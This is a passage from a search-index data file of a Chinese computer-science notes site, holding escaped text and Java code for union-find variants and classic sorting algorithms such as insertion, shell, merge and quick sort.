\u6BD4\u8F83`},{header:"\u524D\u8A00",slug:"\u524D\u8A00",content:`\u7528\u4E8E\u89E3\u51B3\u52A8\u6001\u8FDE\u901A\u6027\u95EE\u9898\uFF0C\u80FD\u52A8\u6001\u8FDE\u63A5\u4E24\u4E2A\u70B9\uFF0C\u5E76\u4E14\u5224\u65AD\u4E24\u4E2A\u70B9\u662F\u5426\u8FDE\u901A\u3002
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/02943a90-7dd4-4e9a-9325-f8217d3cc54d.jpg" width="350) \u65B9\u6CD5
\u63CF\u8FF0 UF(int N)
\u6784\u9020\u4E00\u4E2A\u5927\u5C0F\u4E3A N \u7684\u5E76\u67E5\u96C6 void union(int p, int q)
\u8FDE\u63A5 p \u548C q \u8282\u70B9 int find(int p)
\u67E5\u627E p \u6240\u5728\u7684\u8FDE\u901A\u5206\u91CF\u7F16\u53F7 boolean connected(int p, int q)
\u5224\u65AD p \u548C q \u8282\u70B9\u662F\u5426\u8FDE\u901A public abstract class UF { protected int[] id; public UF(int N) { id = new int[N]; for (int i = 0; i < N; i++) { id[i] = i; } } public boolean connected(int p, int q) { return find(p) == find(q); } public abstract int find(int p); public abstract void union(int p, int q);
}`},{header:"Quick Find",slug:"quick-find",content:`\u53EF\u4EE5\u5FEB\u901F\u8FDB\u884C find \u64CD\u4F5C\uFF0C\u4E5F\u5C31\u662F\u53EF\u4EE5\u5FEB\u901F\u5224\u65AD\u4E24\u4E2A\u8282\u70B9\u662F\u5426\u8FDE\u901A\u3002
\u9700\u8981\u4FDD\u8BC1\u540C\u4E00\u8FDE\u901A\u5206\u91CF\u7684\u6240\u6709\u8282\u70B9\u7684 id \u503C\u76F8\u7B49\uFF0C\u5C31\u53EF\u4EE5\u901A\u8FC7\u5224\u65AD\u4E24\u4E2A\u8282\u70B9\u7684 id \u503C\u662F\u5426\u76F8\u7B49\u4ECE\u800C\u5224\u65AD\u5176\u8FDE\u901A\u6027\u3002
\u4F46\u662F union \u64CD\u4F5C\u4EE3\u4EF7\u5374\u5F88\u9AD8\uFF0C\u9700\u8981\u5C06\u5176\u4E2D\u4E00\u4E2A\u8FDE\u901A\u5206\u91CF\u4E2D\u7684\u6240\u6709\u8282\u70B9 id \u503C\u90FD\u4FEE\u6539\u4E3A\u53E6\u4E00\u4E2A\u8282\u70B9\u7684 id \u503C\u3002
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/0972501d-f854-4d26-8fce-babb27c267f6.jpg" width="320)
public class QuickFindUF extends UF { public QuickFindUF(int N) { super(N); } @Override public int find(int p) { return id[p]; } @Override public void union(int p, int q) { int pID = find(p); int qID = find(q); if (pID == qID) { return; } for (int i = 0; i < id.length; i++) { if (id[i] == pID) { id[i] = qID; } } }
}`},{header:"Quick Union",slug:"quick-union",content:`\u53EF\u4EE5\u5FEB\u901F\u8FDB\u884C union \u64CD\u4F5C\uFF0C\u53EA\u9700\u8981\u4FEE\u6539\u4E00\u4E2A\u8282\u70B9\u7684 id \u503C\u5373\u53EF\u3002
\u4F46\u662F find \u64CD\u4F5C\u5F00\u9500\u5F88\u5927\uFF0C\u56E0\u4E3A\u540C\u4E00\u4E2A\u8FDE\u901A\u5206\u91CF\u7684\u8282\u70B9 id \u503C\u4E0D\u540C\uFF0Cid \u503C\u53EA\u662F\u7528\u6765\u6307\u5411\u53E6\u4E00\u4E2A\u8282\u70B9\u3002\u56E0\u6B64\u9700\u8981\u4E00\u76F4\u5411\u4E0A\u67E5\u627E\u64CD\u4F5C\uFF0C\u76F4\u5230\u627E\u5230\u6700\u4E0A\u5C42\u7684\u8282\u70B9\u3002
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/11b27de5-5a9d-45e4-95cc-417fa3ad1d38.jpg" width="280)
public class QuickUnionUF extends UF { public QuickUnionUF(int N) { super(N); } @Override public int find(int p) { while (p != id[p]) { p = id[p]; } return p; } @Override public void union(int p, int q) { int pRoot = find(p); int qRoot = find(q); if (pRoot != qRoot) { id[pRoot] = qRoot; } }
}
\u8FD9\u79CD\u65B9\u6CD5\u53EF\u4EE5\u5FEB\u901F\u8FDB\u884C union \u64CD\u4F5C\uFF0C\u4F46\u662F find \u64CD\u4F5C\u548C\u6811\u9AD8\u6210\u6B63\u6BD4\uFF0C\u6700\u574F\u7684\u60C5\u51B5\u4E0B\u6811\u7684\u9AD8\u5EA6\u4E3A\u8282\u70B9\u7684\u6570\u76EE\u3002
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/23e4462b-263f-4d15-8805-529e0ca7a4d1.jpg" width="100)`},{header:"\u52A0\u6743 Quick Union",slug:"\u52A0\u6743-quick-union",content:`\u4E3A\u4E86\u89E3\u51B3 quick-union \u7684\u6811\u901A\u5E38\u4F1A\u5F88\u9AD8\u7684\u95EE\u9898\uFF0C\u52A0\u6743 quick-union \u5728 union \u64CD\u4F5C\u65F6\u4F1A\u8BA9\u8F83\u5C0F\u7684\u6811\u8FDE\u63A5\u8F83\u5927\u7684\u6811\u4E0A\u9762\u3002
\u7406\u8BBA\u7814\u7A76\u8BC1\u660E\uFF0C\u52A0\u6743 quick-union \u7B97\u6CD5\u6784\u9020\u7684\u6811\u6DF1\u5EA6\u6700\u591A\u4E0D\u8D85\u8FC7 logN\u3002
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/a9f18f8a-c1ea-422e-aa56-d91716b0f755.jpg" width="150)
public class WeightedQuickUnionUF extends UF { // \u4FDD\u5B58\u8282\u70B9\u7684\u6570\u91CF\u4FE1\u606F private int[] sz; public WeightedQuickUnionUF(int N) { super(N); this.sz = new int[N]; for (int i = 0; i < N; i++) { this.sz[i] = 1; } } @Override public int find(int p) { while (p != id[p]) { p = id[p]; } return p; } @Override public void union(int p, int q) { int i = find(p); int j = find(q); if (i == j) return; if (sz[i] < sz[j]) { id[i] = j; sz[j] += sz[i]; } else { id[j] = i; sz[i] += sz[j]; } }
}`},{header:"\u8DEF\u5F84\u538B\u7F29\u7684\u52A0\u6743 Quick Union",slug:"\u8DEF\u5F84\u538B\u7F29\u7684\u52A0\u6743-quick-union",content:"\u5728\u68C0\u67E5\u8282\u70B9\u7684\u540C\u65F6\u5C06\u5B83\u4EEC\u76F4\u63A5\u94FE\u63A5\u5230\u6839\u8282\u70B9\uFF0C\u53EA\u9700\u8981\u5728 find \u4E2D\u6DFB\u52A0\u4E00\u4E2A\u5FAA\u73AF\u5373\u53EF\u3002"},{header:"\u6BD4\u8F83",slug:"\u6BD4\u8F83",content:`\u7B97\u6CD5
union
find Quick Find
N
1 Quick Union
\u6811\u9AD8
\u6811\u9AD8 \u52A0\u6743 Quick Union
logN
logN \u8DEF\u5F84\u538B\u7F29\u7684\u52A0\u6743 Quick Union
\u975E\u5E38\u63A5\u8FD1 1
\u975E\u5E38\u63A5\u8FD1 1`}]},{path:"/%E7%AE%97%E6%B3%95/%E7%AE%97%E6%B3%95%20-%20%E6%8E%92%E5%BA%8F.html",title:"\u7B97\u6CD5 - \u6392\u5E8F",pathLocale:"/",contents:[{header:"\u7B97\u6CD5 - \u6392\u5E8F",slug:"\u7B97\u6CD5-\u6392\u5E8F",content:""},{header:"\u7EA6\u5B9A",slug:"\u7EA6\u5B9A",content:`\u5F85\u6392\u5E8F\u7684\u5143\u7D20\u9700\u8981\u5B9E\u73B0 Java \u7684 Comparable \u63A5\u53E3\uFF0C\u8BE5\u63A5\u53E3\u6709 compareTo() \u65B9\u6CD5\uFF0C\u53EF\u4EE5\u7528\u5B83\u6765\u5224\u65AD\u4E24\u4E2A\u5143\u7D20\u7684\u5927\u5C0F\u5173\u7CFB\u3002
\u4F7F\u7528\u8F85\u52A9\u51FD\u6570 less() \u548C swap() \u6765\u8FDB\u884C\u6BD4\u8F83\u548C\u4EA4\u6362\u7684\u64CD\u4F5C\uFF0C\u4F7F\u5F97\u4EE3\u7801\u7684\u53EF\u8BFB\u6027\u548C\u53EF\u79FB\u690D\u6027\u66F4\u597D\u3002
\u6392\u5E8F\u7B97\u6CD5\u7684\u6210\u672C\u6A21\u578B\u662F\u6BD4\u8F83\u548C\u4EA4\u6362\u7684\u6B21\u6570\u3002
public abstract class Sort<T extends Comparable<T>> { public abstract void sort(T[] nums); protected boolean less(T v, T w) { return v.compareTo(w) < 0; } protected void swap(T[] a, int i, int j) { T t = a[i]; a[i] = a[j]; a[j] = t; }
}`},{header:"\u9009\u62E9\u6392\u5E8F",slug:"\u9009\u62E9\u6392\u5E8F",content:`\u4ECE\u6570\u7EC4\u4E2D\u9009\u62E9\u6700\u5C0F\u5143\u7D20\uFF0C\u5C06\u5B83\u4E0E\u6570\u7EC4\u7684\u7B2C\u4E00\u4E2A\u5143\u7D20\u4EA4\u6362\u4F4D\u7F6E\u3002\u518D\u4ECE\u6570\u7EC4\u5269\u4E0B\u7684\u5143\u7D20\u4E2D\u9009\u62E9\u51FA\u6700\u5C0F\u7684\u5143\u7D20\uFF0C\u5C06\u5B83\u4E0E\u6570\u7EC4\u7684\u7B2C\u4E8C\u4E2A\u5143\u7D20\u4EA4\u6362\u4F4D\u7F6E\u3002\u4E0D\u65AD\u8FDB\u884C\u8FD9\u6837\u7684\u64CD\u4F5C\uFF0C\u76F4\u5230\u5C06\u6574\u4E2A\u6570\u7EC4\u6392\u5E8F\u3002
\u9009\u62E9\u6392\u5E8F\u9700\u8981 ~N2/2 \u6B21\u6BD4\u8F83\u548C ~N \u6B21\u4EA4\u6362\uFF0C\u5B83\u7684\u8FD0\u884C\u65F6\u95F4\u4E0E\u8F93\u5165\u65E0\u5173\uFF0C\u8FD9\u4E2A\u7279\u70B9\u4F7F\u5F97\u5B83\u5BF9\u4E00\u4E2A\u5DF2\u7ECF\u6392\u5E8F\u7684\u6570\u7EC4\u4E5F\u9700\u8981\u8FD9\u4E48\u591A\u7684\u6BD4\u8F83\u548C\u4EA4\u6362\u64CD\u4F5C\u3002
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/bc6be2d0-ed5e-4def-89e5-3ada9afa811a.gif" width="230px">
public class Selection<T extends Comparable<T>> extends Sort<T> { @Override public void sort(T[] nums) { int N = nums.length; for (int i = 0; i < N - 1; i++) { int min = i; for (int j = i + 1; j < N; j++) { if (less(nums[j], nums[min])) { min = j; } } swap(nums, i, min); } }
}`},{header:"\u5192\u6CE1\u6392\u5E8F",slug:"\u5192\u6CE1\u6392\u5E8F",content:`\u4ECE\u5DE6\u5230\u53F3\u4E0D\u65AD\u4EA4\u6362\u76F8\u90BB\u9006\u5E8F\u7684\u5143\u7D20\uFF0C\u5728\u4E00\u8F6E\u7684\u5FAA\u73AF\u4E4B\u540E\uFF0C\u53EF\u4EE5\u8BA9\u672A\u6392\u5E8F\u7684\u6700\u5927\u5143\u7D20\u4E0A\u6D6E\u5230\u53F3\u4FA7\u3002
\u5728\u4E00\u8F6E\u5FAA\u73AF\u4E2D\uFF0C\u5982\u679C\u6CA1\u6709\u53D1\u751F\u4EA4\u6362\uFF0C\u90A3\u4E48\u8BF4\u660E\u6570\u7EC4\u5DF2\u7ECF\u662F\u6709\u5E8F\u7684\uFF0C\u6B64\u65F6\u53EF\u4EE5\u76F4\u63A5\u9000\u51FA\u3002
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/0f8d178b-52d8-491b-9dfd-41e05a952578.gif" width="200px">
public class Bubble<T extends Comparable<T>> extends Sort<T> { @Override public void sort(T[] nums) { int N = nums.length; boolean isSorted = false; for (int i = N - 1; i > 0 && !isSorted; i--) { isSorted = true; for (int j = 0; j < i; j++) { if (less(nums[j + 1], nums[j])) { isSorted = false; swap(nums, j, j + 1); } } } }
}`},{header:"\u63D2\u5165\u6392\u5E8F",slug:"\u63D2\u5165\u6392\u5E8F",content:`\u6BCF\u6B21\u90FD\u5C06\u5F53\u524D\u5143\u7D20\u63D2\u5165\u5230\u5DE6\u4FA7\u5DF2\u7ECF\u6392\u5E8F\u7684\u6570\u7EC4\u4E2D\uFF0C\u4F7F\u5F97\u63D2\u5165\u4E4B\u540E\u5DE6\u4FA7\u6570\u7EC4\u4F9D\u7136\u6709\u5E8F\u3002
\u5BF9\u4E8E\u6570\u7EC4 {3, 5, 2, 4, 1}\uFF0C\u5B83\u5177\u6709\u4EE5\u4E0B\u9006\u5E8F\uFF1A(3, 2), (3, 1), (5, 2), (5, 4), (5, 1), (2, 1), (4, 1)\uFF0C\u63D2\u5165\u6392\u5E8F\u6BCF\u6B21\u53EA\u80FD\u4EA4\u6362\u76F8\u90BB\u5143\u7D20\uFF0C\u4EE4\u9006\u5E8F\u6570\u91CF\u51CF\u5C11 1\uFF0C\u56E0\u6B64\u63D2\u5165\u6392\u5E8F\u9700\u8981\u4EA4\u6362\u7684\u6B21\u6570\u4E3A\u9006\u5E8F\u6570\u91CF\u3002
\u63D2\u5165\u6392\u5E8F\u7684\u65F6\u95F4\u590D\u6742\u5EA6\u53D6\u51B3\u4E8E\u6570\u7EC4\u7684\u521D\u59CB\u987A\u5E8F\uFF0C\u5982\u679C\u6570\u7EC4\u5DF2\u7ECF\u90E8\u5206\u6709\u5E8F\u4E86\uFF0C\u90A3\u4E48\u9006\u5E8F\u8F83\u5C11\uFF0C\u9700\u8981\u7684\u4EA4\u6362\u6B21\u6570\u4E5F\u5C31\u8F83\u5C11\uFF0C\u65F6\u95F4\u590D\u6742\u5EA6\u8F83\u4F4E\u3002 \u5E73\u5747\u60C5\u51B5\u4E0B\u63D2\u5165\u6392\u5E8F\u9700\u8981 ~N2/4 \u6BD4\u8F83\u4EE5\u53CA ~N2/4 \u6B21\u4EA4\u6362\uFF1B
\u6700\u574F\u7684\u60C5\u51B5\u4E0B\u9700\u8981 ~N2/2 \u6BD4\u8F83\u4EE5\u53CA ~N2/2 \u6B21\u4EA4\u6362\uFF0C\u6700\u574F\u7684\u60C5\u51B5\u662F\u6570\u7EC4\u662F\u5012\u5E8F\u7684\uFF1B
\u6700\u597D\u7684\u60C5\u51B5\u4E0B\u9700\u8981 N-1 \u6B21\u6BD4\u8F83\u548C 0 \u6B21\u4EA4\u6362\uFF0C\u6700\u597D\u7684\u60C5\u51B5\u5C31\u662F\u6570\u7EC4\u5DF2\u7ECF\u6709\u5E8F\u4E86\u3002 ![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/35253fa4-f60a-4e3b-aaec-8fc835aabdac.gif" width="200px">
public class Insertion<T extends Comparable<T>> extends Sort<T> { @Override public void sort(T[] nums) { int N = nums.length; for (int i = 1; i < N; i++) { for (int j = i; j > 0 && less(nums[j], nums[j - 1]); j--) { swap(nums, j, j - 1); } } }
}`},{header:"\u5E0C\u5C14\u6392\u5E8F",slug:"\u5E0C\u5C14\u6392\u5E8F",content:`\u5BF9\u4E8E\u5927\u89C4\u6A21\u7684\u6570\u7EC4\uFF0C\u63D2\u5165\u6392\u5E8F\u5F88\u6162\uFF0C\u56E0\u4E3A\u5B83\u53EA\u80FD\u4EA4\u6362\u76F8\u90BB\u7684\u5143\u7D20\uFF0C\u6BCF\u6B21\u53EA\u80FD\u5C06\u9006\u5E8F\u6570\u91CF\u51CF\u5C11 1\u3002\u5E0C\u5C14\u6392\u5E8F\u7684\u51FA\u73B0\u5C31\u662F\u4E3A\u4E86\u89E3\u51B3\u63D2\u5165\u6392\u5E8F\u7684\u8FD9\u79CD\u5C40\u9650\u6027\uFF0C\u5B83\u901A\u8FC7\u4EA4\u6362\u4E0D\u76F8\u90BB\u7684\u5143\u7D20\uFF0C\u6BCF\u6B21\u53EF\u4EE5\u5C06\u9006\u5E8F\u6570\u91CF\u51CF\u5C11\u5927\u4E8E 1\u3002
\u5E0C\u5C14\u6392\u5E8F\u4F7F\u7528\u63D2\u5165\u6392\u5E8F\u5BF9\u95F4\u9694 h \u7684\u5E8F\u5217\u8FDB\u884C\u6392\u5E8F\u3002\u901A\u8FC7\u4E0D\u65AD\u51CF\u5C0F h\uFF0C\u6700\u540E\u4EE4 h=1\uFF0C\u5C31\u53EF\u4EE5\u4F7F\u5F97\u6574\u4E2A\u6570\u7EC4\u662F\u6709\u5E8F\u7684\u3002
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/7818c574-97a8-48db-8e62-8bfb030b02ba.png" width="450px">
public class Shell<T extends Comparable<T>> extends Sort<T> { @Override public void sort(T[] nums) { int N = nums.length; int h = 1; while (h < N / 3) { h = 3 * h + 1; // 1, 4, 13, 40, ... } while (h >= 1) { for (int i = h; i < N; i++) { for (int j = i; j >= h && less(nums[j], nums[j - h]); j -= h) { swap(nums, j, j - h); } } h = h / 3; } }
} \u5E0C\u5C14\u6392\u5E8F\u7684\u8FD0\u884C\u65F6\u95F4\u8FBE\u4E0D\u5230\u5E73\u65B9\u7EA7\u522B\uFF0C\u4F7F\u7528\u9012\u589E\u5E8F\u5217 1, 4, 13, 40, ... \u7684\u5E0C\u5C14\u6392\u5E8F\u6240\u9700\u8981\u7684\u6BD4\u8F83\u6B21\u6570\u4E0D\u4F1A\u8D85\u8FC7 N \u7684\u82E5\u5E72\u500D\u4E58\u4E8E\u9012\u589E\u5E8F\u5217\u7684\u957F\u5EA6\u3002\u540E\u9762\u4ECB\u7ECD\u7684\u9AD8\u7EA7\u6392\u5E8F\u7B97\u6CD5\u53EA\u4F1A\u6BD4\u5E0C\u5C14\u6392\u5E8F\u5FEB\u4E24\u500D\u5DE6\u53F3\u3002`},{header:"\u5F52\u5E76\u6392\u5E8F",slug:"\u5F52\u5E76\u6392\u5E8F",content:`\u5F52\u5E76\u6392\u5E8F\u7684\u601D\u60F3\u662F\u5C06\u6570\u7EC4\u5206\u6210\u4E24\u90E8\u5206\uFF0C\u5206\u522B\u8FDB\u884C\u6392\u5E8F\uFF0C\u7136\u540E\u5F52\u5E76\u8D77\u6765\u3002
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/ec840967-d127-4da3-b6bb-186996c56746.png" width="300px">`},{header:"1. \u5F52\u5E76\u65B9\u6CD5",slug:"_1-\u5F52\u5E76\u65B9\u6CD5",content:`\u5F52\u5E76\u65B9\u6CD5\u5C06\u6570\u7EC4\u4E2D\u4E24\u4E2A\u5DF2\u7ECF\u6392\u5E8F\u7684\u90E8\u5206\u5F52\u5E76\u6210\u4E00\u4E2A\u3002
public abstract class MergeSort<T extends Comparable<T>> extends Sort<T> { protected T[] aux; protected void merge(T[] nums, int l, int m, int h) { int i = l, j = m + 1; for (int k = l; k <= h; k++) { aux[k] = nums[k]; // \u5C06\u6570\u636E\u590D\u5236\u5230\u8F85\u52A9\u6570\u7EC4 } for (int k = l; k <= h; k++) { if (i > m) { nums[k] = aux[j++]; } else if (j > h) { nums[k] = aux[i++]; } else if (aux[i].compareTo(aux[j]) <= 0) { nums[k] = aux[i++]; // \u5148\u8FDB\u884C\u8FD9\u4E00\u6B65\uFF0C\u4FDD\u8BC1\u7A33\u5B9A\u6027 } else { nums[k] = aux[j++]; } } }
}`},{header:"2. \u81EA\u9876\u5411\u4E0B\u5F52\u5E76\u6392\u5E8F",slug:"_2-\u81EA\u9876\u5411\u4E0B\u5F52\u5E76\u6392\u5E8F",content:`\u5C06\u4E00\u4E2A\u5927\u6570\u7EC4\u5206\u6210\u4E24\u4E2A\u5C0F\u6570\u7EC4\u53BB\u6C42\u89E3\u3002
\u56E0\u4E3A\u6BCF\u6B21\u90FD\u5C06\u95EE\u9898\u5BF9\u534A\u5206\u6210\u4E24\u4E2A\u5B50\u95EE\u9898\uFF0C\u8FD9\u79CD\u5BF9\u534A\u5206\u7684\u7B97\u6CD5\u590D\u6742\u5EA6\u4E00\u822C\u4E3A O(NlogN)\u3002
public class Up2DownMergeSort<T extends Comparable<T>> extends MergeSort<T> { @Override public void sort(T[] nums) { aux = (T[]) new Comparable[nums.length]; sort(nums, 0, nums.length - 1); } private void sort(T[] nums, int l, int h) { if (h <= l) { return; } int mid = l + (h - l) / 2; sort(nums, l, mid); sort(nums, mid + 1, h); merge(nums, l, mid, h); }
}`},{header:"3. \u81EA\u5E95\u5411\u4E0A\u5F52\u5E76\u6392\u5E8F",slug:"_3-\u81EA\u5E95\u5411\u4E0A\u5F52\u5E76\u6392\u5E8F",content:`\u5148\u5F52\u5E76\u90A3\u4E9B\u5FAE\u578B\u6570\u7EC4\uFF0C\u7136\u540E\u6210\u5BF9\u5F52\u5E76\u5F97\u5230\u7684\u5FAE\u578B\u6570\u7EC4\u3002
public class Down2UpMergeSort<T extends Comparable<T>> extends MergeSort<T> { @Override public void sort(T[] nums) { int N = nums.length; aux = (T[]) new Comparable[N]; for (int sz = 1; sz < N; sz += sz) { for (int lo = 0; lo < N - sz; lo += sz + sz) { merge(nums, lo, lo + sz - 1, Math.min(lo + sz + sz - 1, N - 1)); } } }
}`},{header:"\u5FEB\u901F\u6392\u5E8F",slug:"\u5FEB\u901F\u6392\u5E8F",content:""},{header:"1. \u57FA\u672C\u7B97\u6CD5",slug:"_1-\u57FA\u672C\u7B97\u6CD5",content:`\u5F52\u5E76\u6392\u5E8F\u5C06\u6570\u7EC4\u5206\u4E3A\u4E24\u4E2A\u5B50\u6570\u7EC4\u5206\u522B\u6392\u5E8F\uFF0C\u5E76\u5C06\u6709\u5E8F\u7684\u5B50\u6570\u7EC4\u5F52\u5E76\u4F7F\u5F97\u6574\u4E2A\u6570\u7EC4\u6392\u5E8F\uFF1B
\u5FEB\u901F\u6392\u5E8F\u901A\u8FC7\u4E00\u4E2A\u5207\u5206\u5143\u7D20\u5C06\u6570\u7EC4\u5206\u4E3A\u4E24\u4E2A\u5B50\u6570\u7EC4\uFF0C\u5DE6\u5B50\u6570\u7EC4\u5C0F\u4E8E\u7B49\u4E8E\u5207\u5206\u5143\u7D20\uFF0C\u53F3\u5B50\u6570\u7EC4\u5927\u4E8E\u7B49\u4E8E\u5207\u5206\u5143\u7D20\uFF0C\u5C06\u8FD9\u4E24\u4E2A\u5B50\u6570\u7EC4\u6392\u5E8F\u4E5F\u5C31\u5C06\u6574\u4E2A\u6570\u7EC4\u6392\u5E8F\u4E86\u3002 ![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/6234eb3d-ccf2-4987-a724-235aef6957b1.png" width="280px">
public class QuickSort<T extends Comparable<T>> extends Sort<T> { @Override public void sort(T[] nums) { shuffle(nums); sort(nums, 0, nums.length - 1); } private void sort(T[] nums, int l, int h) { if (h <= l) return; int j = partition(nums, l, h); sort(nums, l, j - 1); sort(nums, j + 1, h); } private void shuffle(T[] nums) { List<Comparable> list = Arrays.asList(nums); Collections.shuffle(list); list.toArray(nums); }
}`},{header:"2. \u5207\u5206",slug:"_2-\u5207\u5206",content:`\u53D6 a[l] \u4F5C\u4E3A\u5207\u5206\u5143\u7D20\uFF0C\u7136\u540E\u4ECE\u6570\u7EC4\u7684\u5DE6\u7AEF\u5411\u53F3\u626B\u63CF\u76F4\u5230\u627E\u5230\u7B2C\u4E00\u4E2A\u5927\u4E8E\u7B49\u4E8E\u5B83\u7684\u5143\u7D20\uFF0C\u518D\u4ECE\u6570\u7EC4\u7684\u53F3\u7AEF\u5411\u5DE6\u626B\u63CF\u627E\u5230\u7B2C\u4E00\u4E2A\u5C0F\u4E8E\u5B83\u7684\u5143\u7D20\uFF0C\u4EA4\u6362\u8FD9\u4E24\u4E2A\u5143\u7D20\u3002\u4E0D\u65AD\u8FDB\u884C\u8FD9\u4E2A\u8FC7\u7A0B\uFF0C\u5C31\u53EF\u4EE5\u4FDD\u8BC1\u5DE6\u6307\u9488 i \u7684\u5DE6\u4FA7\u5143\u7D20\u90FD\u4E0D\u5927\u4E8E\u5207\u5206\u5143\u7D20\uFF0C\u53F3\u6307\u9488 j \u7684\u53F3\u4FA7\u5143\u7D20\u90FD\u4E0D\u5C0F\u4E8E\u5207\u5206\u5143\u7D20\u3002\u5F53\u4E24\u4E2A\u6307\u9488\u76F8\u9047\u65F6\uFF0C\u5C06\u5207\u5206\u5143\u7D20 a[l] \u548C a[j] \u4EA4\u6362\u4F4D\u7F6E\u3002
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/c4859290-e27d-4f12-becf-e2a5c1f3a275.gif" width="320px">
private int partition(T[] nums, int l, int h) { int i = l, j = h + 1; T v = nums[l]; while (true) { while (less(nums[++i], v) && i != h) ; while (less(v, nums[--j]) && j != l) ; if (i >= j) break; swap(nums, i, j); } swap(nums, l, j); return j;
}`},{header:"3. \u6027\u80FD\u5206\u6790",slug:"_3-\u6027\u80FD\u5206\u6790",content:`\u5FEB\u901F\u6392\u5E8F\u662F\u539F\u5730\u6392\u5E8F\uFF0C\u4E0D\u9700\u8981\u8F85\u52A9\u6570\u7EC4\uFF0C\u4F46\u662F\u9012\u5F52\u8C03\u7528\u9700\u8981\u8F85\u52A9\u6808\u3002
\u5FEB\u901F\u6392\u5E8F\u6700\u597D\u7684\u60C5\u51B5\u4E0B\u662F\u6BCF\u6B21\u90FD\u6B63\u597D\u5C06\u6570\u7EC4\u5BF9\u534A\u5206\uFF0C\u8FD9\u6837\u9012\u5F52\u8C03\u7528\u6B21\u6570\u624D\u662F\u6700\u5C11\u7684\u3002\u8FD9\u79CD\u60C5\u51B5\u4E0B\u6BD4\u8F83\u6B21\u6570\u4E3A CN=2CN/2+N\uFF0C\u590D\u6742\u5EA6\u4E3A O(NlogN)\u3002
\u6700\u574F\u7684\u60C5\u51B5\u4E0B\uFF0C\u7B2C\u4E00\u6B21\u4ECE\u6700\u5C0F\u7684\u5143\u7D20\u5207\u5206\uFF0C\u7B2C\u4E8C\u6B21\u4ECE\u7B2C\u4E8C\u5C0F\u7684\u5143\u7D20\u5207\u5206\uFF0C\u5982\u6B64\u8FD9\u822C\u3002\u56E0\u6B64\u6700\u574F\u7684\u60C5\u51B5\u4E0B\u9700\u8981\u6BD4\u8F83 N2/2\u3002\u4E3A\u4E86\u9632\u6B62\u6570\u7EC4\u6700\u5F00\u59CB\u5C31\u662F\u6709\u5E8F\u7684\uFF0C\u5728\u8FDB\u884C\u5FEB\u901F\u6392\u5E8F\u65F6\u9700\u8981\u968F\u673A\u6253\u4E71\u6570\u7EC4\u3002`},{header:"4. \u7B97\u6CD5\u6539\u8FDB",slug:"_4-\u7B97\u6CD5\u6539\u8FDB",content:""},{header:"4.1 \u5207\u6362\u5230\u63D2\u5165\u6392\u5E8F",slug:"_4-1-\u5207\u6362\u5230\u63D2\u5165\u6392\u5E8F",content:"\u56E0\u4E3A\u5FEB\u901F\u6392\u5E8F\u5728\u5C0F\u6570\u7EC4\u4E2D\u4E5F\u4F1A\u9012\u5F52\u8C03\u7528\u81EA\u5DF1\uFF0C\u5BF9\u4E8E\u5C0F\u6570\u7EC4\uFF0C\u63D2\u5165\u6392\u5E8F\u6BD4\u5FEB\u901F\u6392\u5E8F\u7684\u6027\u80FD\u66F4\u597D\uFF0C\u56E0\u6B64\u5728\u5C0F\u6570\u7EC4\u4E2D\u53EF\u4EE5\u5207\u6362\u5230\u63D2\u5165\u6392\u5E8F\u3002"},{header:"4.2 \u4E09\u6570\u53D6\u4E2D",slug:"_4-2-\u4E09\u6570\u53D6\u4E2D",content:"\u6700\u597D\u7684\u60C5\u51B5\u4E0B\u662F\u6BCF\u6B21\u90FD\u80FD\u53D6\u6570\u7EC4\u7684\u4E2D\u4F4D\u6570\u4F5C\u4E3A\u5207\u5206\u5143\u7D20\uFF0C\u4F46\u662F\u8BA1\u7B97\u4E2D\u4F4D\u6570\u7684\u4EE3\u4EF7\u5F88\u9AD8\u3002\u4E00\u79CD\u6298\u4E2D\u65B9\u6CD5\u662F\u53D6 3 \u4E2A\u5143\u7D20\uFF0C\u5E76\u5C06\u5927\u5C0F\u5C45\u4E2D\u7684\u5143\u7D20\u4F5C\u4E3A\u5207\u5206\u5143\u7D20\u3002"},{header:"4.3 \u4E09\u5411\u5207\u5206",slug:"_4-3-\u4E09\u5411\u5207\u5206",content:`\u5BF9\u4E8E\u6709\u5927\u91CF\u91CD\u590D\u5143\u7D20\u7684\u6570\u7EC4\uFF0C\u53EF\u4EE5\u5C06\u6570\u7EC4\u5207\u5206\u4E3A\u4E09\u90E8\u5206\uFF0C\u5206\u522B\u5BF9\u5E94\u5C0F\u4E8E\u3001\u7B49\u4E8E\u548C\u5927\u4E8E\u5207\u5206\u5143\u7D20\u3002
\u4E09\u5411\u5207\u5206\u5FEB\u901F\u6392\u5E8F\u5BF9\u4E8E\u6709\u5927\u91CF\u91CD\u590D\u5143\u7D20\u7684\u968F\u673A\u6570\u7EC4\u53EF\u4EE5\u5728\u7EBF\u6027\u65F6\u95F4\u5185\u5B8C\u6210\u6392\u5E8F\u3002
public class ThreeWayQuickSort<T extends Comparable<T>> extends QuickSort<T> { @Override protected void sort(T[] nums, int l, int h) { if (h <= l) { return; } int lt = l, i = l + 1, gt = h; T v = nums[l]; while (i <= gt) { int cmp = nums[i].compareTo(v); if (cmp < 0) { swap(nums, lt++, i++); } else if (cmp > 0) { swap(nums, i, gt--); } else { i++; } } sort(nums, l, lt - 1); sort(nums, gt + 1, h); }
